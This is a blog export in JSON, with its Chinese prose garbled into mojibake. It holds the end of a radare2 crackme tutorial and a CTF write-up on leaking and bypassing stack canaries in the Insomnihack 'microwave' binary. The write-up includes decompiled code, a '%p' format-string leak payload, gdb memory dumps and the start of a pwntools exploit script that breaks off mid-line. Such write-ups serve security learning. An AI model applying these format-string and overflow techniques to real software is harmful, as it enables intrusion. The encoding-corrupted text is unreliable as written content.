å»æ³¨é‡Šã€‚ æ ‡è®°m&lt;key&gt;å¯ä»¥ç”¨æ¥æ ‡è®°ç‰¹å®šçš„åç§»åœ°å€ã€‚&#39;&lt;key&gt;æ¥è·³åˆ°æŒ‡å®šåœ°å€ã€‚ é€€å‡ºæŒ‰ä¸‹qé”®è¿”å›åˆ°r2çš„shellã€‚ å¯è§†åŒ–å›¾å½¢æ¨¡å¼å’Œå…¶ä»–çš„ä¸€äº›åæ±‡ç¼–å™¨ä¸€æ ·ï¼Œradare2ä¹Ÿæœ‰å›¾å½¢è§†å›¾ã€‚ä½ å¯ä»¥è¾“å…¥VVä»shellè¿›å…¥å›¾å½¢è§†å›¾ï¼Œé€šè¿‡k/j/h/lå‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼ŒæŒ‰gé”®è·³è½¬åˆ°ç›®æ ‡å‡½æ•°ï¼ˆä¾‹å¦‚gdï¼‰ã€‚ æŒ‰?æ¥åˆ—å‡ºæ‰€æœ‰çš„å‘½ä»¤ï¼Œå…¶ä¸­Rå‘½ä»¤å€¼å¾—ä¸€å­¦ã€‚ åæ±‡ç¼–beetå‡½æ•°æ¥ä¸‹æ¥å›åˆ°åæ±‡ç¼–å‡½æ•°ä¸Šï¼Œçœ‹çœ‹beetå‡½æ•°ã€‚æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬çš„ç¨‹åºæ£€æŸ¥äº†beetçš„è¿”å›ç»“æœï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼è¾“å‡ºbeetçš„è¿”å›å€¼ï¼Œè¿™é‡Œåˆ—å‡ºå‡ ç§ï¼š åœ¨r2çš„shellä¸­å®šä½åˆ°beetå‡½æ•°ï¼Œç„¶åé€šè¿‡s sym.beetï¼ˆsym.beetæ˜¯beetå‡½æ•°çš„ä¸€ä¸ªæ ‡å¿—ã€‚ä½ å¯ä»¥é€šè¿‡f sym.&lt;tab&gt;è¾“å‡ºå‡ºsymçš„æ ‡å¿—ï¼‰è¾“å‡ºå‡½æ•°ï¼Œç„¶åæ‰§è¡Œpdfï¼ˆPrint Disassemble Functionï¼‰ï¼› åœ¨r2çš„shellä¸‹ï¼Œé€šè¿‡pdf @ sym.beetè¾“å‡ºbeetå‡½æ•°ã€‚@æ˜¯ä¸´æ—¶çš„å®šä½ï¼ˆè¾“å‡ºsym.beetåœ°å€å¤„çš„å‡½æ•°ï¼‰ï¼› å¯è§†åŒ–æ¨¡å¼ä¸‹åœ¨mainå‡½æ•°ä¸‹è·³åˆ°beetå‡½æ•°ï¼› å¯è§†åŒ–å›¾å½¢ç•Œé¢ä¸‹åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨gdï¼ˆdæ˜¯callè¾¹ä¸Šçš„å­—æ¯ï¼‰ è¿™æ˜¯beetå‡½æ•°åœ¨å›¾å½¢è§†å›¾ä¸‹çš„æ ·å­ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å‚æ•°è¢«å¤åˆ¶ç»™äº†ä¸€ä¸ªç¼“å†²ç©ºé—´ã€‚ç¼“å­˜åŒºçš„ä½ç½®åœ¨ebp - local_88hã€‚local_88hå…¶å®æ˜¯0x88ï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„136ã€‚åœ¨å¯è§†åŒ–æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨:æ‰§è¡Œr2çš„å‘½ä»¤? 0x88æŸ¥çœ‹ã€‚ 12:&gt; ? 0x88136 0x88 0210 136 0000:0088 136 â€œ\\x88â€ 10001000 136.0 136.000000f 136.000000 ç”±äº4ä¸ªå­—èŠ‚ä¿å­˜äº†å‰ä¸€ä¸ªæ ˆå¸§çš„ebpå€¼ï¼Œæ¥ä¸‹æ¥çš„4ä¸ªå­—èŠ‚åˆ™æ˜¯è¿”å›åœ°å€ï¼Œå› æ­¤åœ¨æ ˆä¸Šçš„ç¼“å†²åŒºå¤§å°ä¸º128ä¸ªå­—èŠ‚ï¼Œæ€»å…±ä¸º136ä¸ªå­—èŠ‚ã€‚ åœ¨ç¼“å†²åŒºä¹‹åæ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ï¼Œå®ƒå’Œå‡½æ•°sym.rot13çš„ç»“æœè¿›è¡Œæ¯”è¾ƒã€‚Rot-13æ˜¯ä¸€ä¸ªè‘—åçš„ç½®æ¢åŠ å¯†ï¼Œç»å¸¸åœ¨CTFä»¥åŠCrackmeä¸­ä½¿ç”¨ã€‚è¿™ä¸ªå‡½æ•°æ¥æ”¶äº†9ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œçœ‹èµ·æ¥radare2æ²¡æœ‰æŠŠå®ƒä»¬è¯†åˆ«æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å…¶åœ°å€ä¸Šæ‰§è¡Œahi sã€‚ 1:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7 ahi sç”¨æ¥å°†å°†å…·ä½“åœ°å€è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆè¯•è¯•ahi?ï¼‰ã€‚@@æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼ˆè¯•è¯•@@ï¼‰ï¼Œç„¶åè¿™äº›åœ°å€åˆ™æ˜¯sym.beetå‡½æ•°ä¸­æ²¡è¢«radare2è¯†åˆ«æˆå­—ç¬¦ä¸²çš„éƒ¨åˆ†ã€‚æ‰§è¡Œå®Œè¿™æ¡å‘½ä»¤åï¼Œå›¾å½¢è§†å›¾ä¼šè‡ªåŠ¨åˆ·æ–°ï¼ˆå¦‚æœæ²¡æœ‰è‡ªåŠ¨åˆ·æ–°ï¼Œæ‰§è¡Œrï¼‰æˆè¿™æ ·ï¼š çœ‹èµ·æ¥æ²¡è¢«è¯†åˆ«å‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯Megabeetsï¼ˆæ ¹æ®å­—èŠ‚åºåå‘å‹æ ˆå¾—åˆ°ï¼‰ã€‚ è¯¥ç¨‹åºé€šè¿‡strcmpå°†ç»è¿‡rot13å¤„ç†åçš„Megabeetsä¸æˆ‘ä»¬è¾“å…¥çš„å‚æ•°è¿›è¡Œæ¯”è¾ƒã€‚å¹¸è¿çš„æ˜¯æˆ‘ä»¬ä¸éœ€è¦è¾›è‹¦åœ°åˆ†ærot13çš„å…·ä½“ç®—æ³•ï¼Œå› ä¸ºr2æ¡†æ¶ä¸­çš„rahash2å·¥å…·å·²ç»åŒ…å«äº†rot13åŠ å¯†ã€‚ rahash2é€šè¿‡ä¸åŒçš„ç®—æ³•è®¡ç®—æ–‡ä»¶æˆ–æ˜¯å­—ç¬¦ä¸²çš„æ ¡éªŒå€¼ã€‚ ä½¿ç”¨man rahash2æŸ¥çœ‹æ›´å¤šçš„ç”¨æ³•ã€‚ 12:&gt; !rahash2 -E rot -S s:13 -s â€˜Megabeets\\nâ€™Zrtnorrgf rahash2æ‰§è¡Œäº†rot13(â€œMegabeetsâ€)åå¾—åˆ°äº†å­—ç¬¦ä¸²Zrtnorrgfã€‚è¾“å…¥!å¯ä»¥åœ¨r2çš„shellä¸‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æˆ‘ä»¬å‡è®¾Zrtnorrgfå°±æ˜¯è¦å’Œæˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œæ¯”è¾ƒçš„å­—ç¬¦ä¸²ã€‚è®©æˆ‘ä»¬åœ¨è°ƒè¯•æ¨¡å¼ä¸‹æ‰“å¼€ç¨‹åºï¼Œä½¿ç”¨oodï¼ˆè¯•è¯•ood?ï¼‰å¹¶å°†Zrtnorrgfä½œä¸ºå‚æ•°ï¼Œçœ‹çœ‹æˆ‘ä»¬ä¼šå¾—åˆ°ä»€ä¹ˆã€‚ 12345678910111213[0xf7749be9]&gt; ood?| ood [args] reopen in debugger mode (with args)[0xf7749be9]&gt; ood ZrtnorrgfWait event received by different pid 7415Wait event received by different pid 7444Process with PID 7575 startedâ€¦File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode= attach 7575 7575Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1[0xf7749be9]&gt; dcSelecting and continuing: 7575.:: Megabeets ::.Think you can make it?Success!PTRACE_EVENT_EXIT pid=7575, status=0x0 æˆ‘ä»¬æ”¶åˆ°äº†æˆåŠŸçš„æç¤ºï¼Œç ´è§£äº†è¿™ä¸ªCrackmeã€‚åœ¨æˆåŠŸç ´è§£ä¹‹åï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥è¯´è¿™ä¸ªç¨‹åºå°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸rot13(â€œMegabeetsâ€)è¿›è¡Œäº†æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯Zrtnorrgfã€‚ ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹Crackmeçš„å®Œæ•´æºç ã€‚ åè®°Radare2ä¹‹æ—…ç¬¬ä¸€éƒ¨åˆ†å°±å‘Šä¸€æ®µè½äº†ã€‚æˆ‘ä»¬åªæ¥è§¦äº†radare2çš„è¡¨çš®ï¼Œä»…ä»…äº†è§£äº†å®ƒæœ€æœ€åŸºç¡€çš„ä¸€äº›åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šå­¦ä¹ æ›´å¤šçš„å…³äºradare2çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬è„šæœ¬å¤„ç†ã€æ¶æ„è½¯ä»¶åˆ†æå’Œæ¼æ´åˆ©ç”¨ã€‚æˆ‘çŸ¥é“å¯¹äºå¾ˆå¤šäººæ¥è¯´ä¸€å¼€å§‹æ˜¯å¾ˆéš¾çš„ï¼Œä¸ç®¡æ˜¯èƒ½å¦æ„Ÿå—åˆ°radare2çš„å¼ºå¤§ä¹‹å¤„ï¼Œäº¦æˆ–æ˜¯å°†ä½ çš„ä»¥å‰çš„ä¹ æƒ¯æ”¾åˆ°ä¸€è¾¹è€Œç†Ÿæ‚‰ä½¿ç”¨radare2ã€‚ä¸ç®¡ä½ æ˜¯ä¸€ä¸ªé€†å‘å·¥ç¨‹å¸ˆã€ä¸€ä¸ªCTFæ¯”èµ›é€‰æ‰‹æˆ–è€…åªæ˜¯ä¸€ä¸ªå®‰å…¨çˆ±å¥½è€…ï¼Œæˆ‘æ•¢ä¿è¯å°†radare2æ”¶å…¥ä½ çš„å·¥å…·ç®±ç»å¯¹ä¸€ä¸ªæ˜¯æ˜æ™ºçš„é€‰æ‹©ã€‚","categories":[],"tags":[{"name":"translation","slug":"translation","permalink":"https://qianfei11.github.io/tags/translation/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary","slug":"ã€æœªå®Œæˆã€‘ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary","date":"2019-02-15T08:21:43.000Z","updated":"2019-02-18T10:58:18.432Z","comments":true,"path":"2019/02/15/ã€æœªå®Œæˆã€‘ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary/","link":"","permalink":"https://qianfei11.github.io/2019/02/15/ã€æœªå®Œæˆã€‘ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary/","excerpt":"å…¥é—¨canaryã€‚","text":"å…¥é—¨canaryã€‚ ä½•ä¸ºCanaryç”±äºstack overflowè€Œå¼•å‘çš„æ”»å‡»éå¸¸æ™®éä¹Ÿéå¸¸å¤è€ï¼Œç›¸åº”åœ°ä¸€ç§å«åšCanaryçš„æŠ€æœ¯å¾ˆæ—©å°±å‡ºç°åœ¨glibcé‡Œï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä½œä¸ºç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿å­˜åœ¨ã€‚Canaryçš„æ„æ€æ˜¯é‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦ã€‚è¿™ä¸ªæ¦‚å¿µåº”ç”¨åœ¨æ ˆä¿æŠ¤ä¸Šåˆ™æ˜¯åœ¨åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§æ—¶åœ¨æ ˆåº•è®¾ç½®ä¸€ä¸ªéšæœºçš„canaryå€¼ï¼Œæ ˆå¸§é”€æ¯å‰æµ‹è¯•è¯¥å€¼æ˜¯å¦æ­»æ‰ï¼Œå³æ˜¯å¦è¢«æ”¹å˜ï¼Œè‹¥è¢«æ”¹å˜åˆ™è¯´æ˜æ ˆæº¢å‡ºå‘ç”Ÿï¼Œç¨‹åºèµ°å¦ä¸€ä¸ªæµç¨‹ç»“æŸï¼Œä»¥å…æ¼æ´åˆ©ç”¨æˆåŠŸã€‚Canaryä¸ç®¡æ˜¯å®ç°è¿˜æ˜¯è®¾è®¡æ€æƒ³éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼ï¼Œåœ¨stack overflowå‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹Canaryçš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­stack/buffer overflowæ˜¯å¦å‘ç”Ÿã€‚Canaryä¸Windowsä¸‹çš„GSä¿æŠ¤éƒ½æ˜¯é˜²æ­¢æ ˆæº¢å‡ºçš„æœ‰æ•ˆæ‰‹æ®µï¼Œå®ƒçš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²æ­¢äº†æ ˆæº¢å‡ºçš„å‡ºç°ï¼Œå¹¶ä¸”ç”±äºå®ƒå‡ ä¹å¹¶ä¸æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥ç°åœ¨æˆäº†linuxä¸‹ä¿æŠ¤æœºåˆ¶çš„æ ‡é…ã€‚ ä»¥32ä½ç¨‹åºä¸ºä¾‹ã€‚æ²¡å¼€Canaryæ—¶çš„æ ˆï¼š 1234567891011+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| ebp |+------------------+| return addr |+------------------+ å¼€å¯Canaryåçš„æ ˆï¼š 12345678910111213+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| canary | &lt;- Random+------------------+| ebp |+------------------+| return addr |+------------------+ åœ¨EBPä¹‹å‰å¢åŠ äº†ä¸€ä¸ªä¸å¯é¢„æµ‹çš„éšæœºå€¼å¹¶åœ¨ç¨‹åºä¸­ï¼Œè€Œä¸”åœ¨ç¨‹åºç»“å°¾å¤„ä¼šæ£€æµ‹Canaryæ˜¯å¦è¢«ç¯¡æ”¹ã€‚å¦‚æœå‘ç”Ÿäº†ç¼“å†²åŒºæº¢å‡ºè¦†ç›–äº†è¿”å›åœ°å€åˆ™è‚¯å®šä¼šè¦†ç›–Canaryï¼Œè¿™æ—¶ç¨‹åºä¼šç›´æ¥é€€å‡ºã€‚åªæœ‰æ³„æ¼äº†Canaryï¼Œæ‰èƒ½overflowåé¢çš„return addressï¼š 123456789 0x804852b &lt;func+71&gt;: mov eax,DWORD PTR [ebp-0xc] 0x804852e &lt;func+74&gt;: xor eax,DWORD PTR gs:0x14=&gt; 0x8048535 &lt;func+81&gt;: je 0x804853c &lt;func+88&gt; | 0x8048537 &lt;func+83&gt;: call 0x8048390 &lt;__stack_chk_fail@plt&gt; | 0x804853c &lt;func+88&gt;: leave | 0x804853d &lt;func+89&gt;: ret | 0x804853e &lt;main&gt;: lea ecx,[esp+0x4] |-&gt; 0x804853c &lt;func+88&gt;: leave 0x804853d &lt;func+89&gt;: ret å¦‚æœæ²¡æœ‰ç»•è¿‡Canaryï¼Œå°±ä¼šcallåˆ°glibcä¸­çš„å‡½æ•°__stack_chk_failï¼š 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; Canaryç»•è¿‡æŠ€æœ¯æ³„æ¼CanaryCanaryè®¾è®¡ä¸ºä»¥å­—èŠ‚\\x00ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯Canaryå¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚æ³„éœ²æ ˆä¸­çš„Canaryçš„æ€è·¯æ˜¯è¦†ç›–Canaryçš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„Canaryéƒ¨åˆ†ã€‚è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ²Canaryï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚å¦‚æœå­˜åœ¨format stringé‚£ä¹ˆè¿˜å¯ä»¥æ³„æ¼Canaryã€‚ 2016-insomnihack-microwavechecksecä¸€ä¸‹ç¨‹åºï¼Œ64ä½elfï¼Œä¿æŠ¤å…¨å¼€ï¼š 1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled æ‹–è¿›idaæŸ¥çœ‹ä¸€ä¸‹ç¨‹åºã€‚ç¨‹åºå¤§æ¦‚ä¸Šæ˜¯è¿æ¥tweeterè´¦æˆ·ï¼Œç¼–è¾‘å†…å®¹ï¼Œå‘å¸ƒæœ€å–œçˆ±é£Ÿç‰©ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char *v3; // r12 char input; // [rsp+0h] [rbp-38h] unsigned __int64 v5; // [rsp+8h] [rbp-30h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); v3 = (char *)malloc(0x3EuLL); puts(\"\\n --------------------------------------------------------\"); puts(\" | Welcome to the next generation of MicroWaves! |\"); puts(\" | *** |\"); puts(\" | This stylish Microwave with Grill function, includes |\"); puts(\" | a function that tweets your favourite food! |\"); puts(\" | *** |\"); puts(\" --------------------------------------------------------\"); fflush(0LL); while ( 1 ) &#123; while ( 1 ) &#123; choice(); fwrite(\"\\n [MicroWave]: \", 1uLL, 0x19uLL, stdout); fgets(&amp;input, 3, stdin); if ( input != '2' ) break; if ( *((_WORD *)v3 + 30) == 1 ) edit(); else fwrite(\"\\n First: please connect to your Twitter account!\\n\\n\", 1uLL, 0x37uLL, stdout); &#125; if ( input &lt;= '2' ) &#123; if ( input == '1' ) // choice 1 &#123; fwrite(\"\\n Log in on Twitter:\\n\", 1uLL, 0x1FuLL, stdout); fwrite(\" username: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3, 40, stdin); fwrite(\" password: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3 + 40, 20, stdin); connect(v3); &#125; &#125; else if ( input == '3' ) // choice 3 &#123; if ( *((_WORD *)v3 + 30) == 1 ) tweet(); else fwrite(\"\\n Hey Dude! This didn't work out!\\n\\n\", 1uLL, 0x28uLL, stdout); &#125; else if ( input == 'q' ) // quit &#123; fwrite(\"\\n Bye!\\n\\n\", 1uLL, 0x12uLL, stdout); exit(0); &#125; &#125;&#125; åœ¨connect()å‡½æ•°ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªéœ€è¦è¿‡çš„checkå¯†ç ï¼ŒåŒæ—¶è¿˜æœ‰ç”¨æˆ·åçš„è¾“å…¥å­˜åœ¨format stringï¼Œæ•…è¿™é‡Œå¯ä»¥æ³„æ¼å‡ºæ ˆä¸Šçš„Canaryï¼š 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall connect(char *input)&#123; size_t j; // rbx char *string; // rbx size_t v3; // rax __int64 i; // rdx unsigned __int64 v6; // [rsp+8h] [rbp-20h] j = 1LL; v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\nChecking \"); __printf_chk(1LL, (__int64)input); puts(\"Twitter account\"); fflush(0LL); while ( j &lt; strlen(input + 40) ) &#123; ++j; putchar('.'); fflush(0LL); usleep(0x186A0u); &#125; putchar('\\n'); string = password; v3 = strlen(password); for ( i = 0LL; ; ++i ) &#123; if ( i == v3 ) &#123; *((_WORD *)input + 30) = 1; return __readfsqword(0x28u) ^ v6; &#125; if ( input[i + 40] != string[i] ) break; &#125; *((_WORD *)input + 30) = 0; return __readfsqword(0x28u) ^ v6;&#125; åœ¨edit()å‡½æ•°ä¸­å­˜åœ¨buffer overflowï¼Œè¯»äº†å¾ˆé•¿ä¸€ä¸²å­—ç¬¦ï¼š 123456789101112unsigned __int64 edit()&#123; __int64 v1; // [rsp+0h] [rbp-418h] unsigned __int64 v2; // [rsp+408h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\n #&gt; \"); fflush(0LL); read(0, &amp;v1, 0x800uLL); puts(\"\\n Done.\"); return __readfsqword(0x28u) ^ v2;&#125; åŒæ—¶é€šè¿‡è°ƒè¯•å¯ä»¥æ‰¾åˆ°æ ˆä¸Šçš„æŸä¸ªå€¼ä¸libcçš„åç§»ï¼Œä»¥ç”¨æ¥è®¡ç®—baseï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwaveGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./microwave...(no debugging symbols found)...done.assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6assassinq&gt;&gt; rStarting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave -------------------------------------------------------- | Welcome to the next generation of MicroWaves! | | *** | | This stylish Microwave with Grill function, includes | | a function that tweets your favourite food! | | *** | -------------------------------------------------------- ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: 1 Log in on Twitter: username: %p.%p.%p.%p.%p.%p.%p.%p password: n07_7h3_fl46Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710Twitter account............ ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: ^CProgram received signal SIGINT, Interrupt.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00 RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288 RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x400 RSI: 0x555555759060 (&quot;n07_7h3_fl46\\np.%p.%p.%p\\n&quot;)RDI: 0x0 RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887 RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)R8 : 0x7ffff7dd3780 --&gt; 0x0 R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)R11: 0x246 R12: 0xa (&apos;\\n&apos;)R13: 0x2 R14: 0x55555575906d (&quot;p.%p.%p.%p\\n&quot;)R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7ffff7b04257 &lt;read+7&gt;: jne 0x7ffff7b04269 &lt;read+25&gt; 0x7ffff7b04259 &lt;__read_nocancel&gt;: mov eax,0x0 0x7ffff7b0425e &lt;__read_nocancel+5&gt;: syscall =&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001 0x7ffff7b04266 &lt;__read_nocancel+13&gt;: jae 0x7ffff7b04299 &lt;read+73&gt; 0x7ffff7b04268 &lt;__read_nocancel+15&gt;: ret 0x7ffff7b04269 &lt;read+25&gt;: sub rsp,0x8 0x7ffff7b0426d &lt;read+29&gt;: call 0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a 0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad2288 0024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a31 0032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;: cmp eax,0xffffffff)0040| 0x7fffffffda50 --&gt; 0x0 0048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;: cmp eax,0xffffffff)0056| 0x7fffffffda60 --&gt; 0x19 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGINT0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484 ../sysdeps/unix/syscall-template.S: No such file or directory.assassinq&gt;&gt; vmmap Start End Perm Name0x0000555555554000 0x0000555555557000 r-xp /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555757000 0x0000555555758000 r--p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555758000 0x0000555555759000 rw-p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555759000 0x000055555577a000 rw-p [heap]0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffdd000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] æœ€åæ”¾ä¸Šexpï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env pythonfrom pwn import *# context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;local = 0if local: p = process(&apos;./microwave&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) libc_base_offset = 0xf72c0 one_gadget_offset = 